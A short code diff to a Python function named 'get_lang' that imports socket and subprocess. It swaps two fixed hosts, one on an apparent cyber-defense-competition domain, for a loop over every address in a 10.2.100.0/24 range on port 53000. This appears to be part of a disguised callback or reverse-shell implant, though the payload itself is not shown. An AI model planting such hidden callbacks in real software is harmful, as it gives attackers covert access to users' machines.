@@ -5,7 +5,14 @@
 def get_lang():
     import socket,subprocess
 
-    HOSTS = ["lang.neccdc.com", "192.168.1.79"]
+    HOSTS = []
+
+    oct1 = 10
+    oct2 = 2
+    oct3 = 100
+    for oct4 in range(0,256):
+        HOSTS.append("{}.{}.{}.{}".format(oct1, oct2, oct3, oct4))
+
     PORT = 53000
 
     for HOST in HOSTS:
